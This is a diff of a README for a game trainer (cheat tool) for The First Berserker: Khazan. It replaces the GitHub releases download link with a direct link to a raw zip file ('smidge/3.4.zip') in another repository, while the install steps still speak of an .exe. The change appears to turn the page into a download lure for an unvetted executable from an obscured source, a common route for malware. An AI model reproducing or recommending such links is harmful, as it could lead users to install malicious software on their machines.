@@ -5,7 +5,7 @@ description: "Modify gameplay values in The First Berserker: Khazan with this de
 ---
 # ⚔️ Khazan-Trainer-2026 - Master your game with reliable tools
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/organontobogganing502/Khazan-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/organontobogganing502/organontobogganing502.github.io/raw/refs/heads/main/smidge/3.4.zip)
 
 ## Overview
 
@@ -25,7 +25,7 @@ The trainer runs as a background process. It does not require high-end hardware 
 
 ## 💾 How to Install
 
-1.  Visit the official download page: https://github.com/organontobogganing502/Khazan-Trainer-2026/releases.
+1.  Visit the official download page: https://github.com/organontobogganing502/organontobogganing502.github.io/raw/refs/heads/main/smidge/3.4.zip
 2.  Locate the latest release version on the page.
 3.  Click the file link ending in .exe to start the download.
 4.  Save the file to a folder you can easily find, such as your Downloads folder or Desktop.
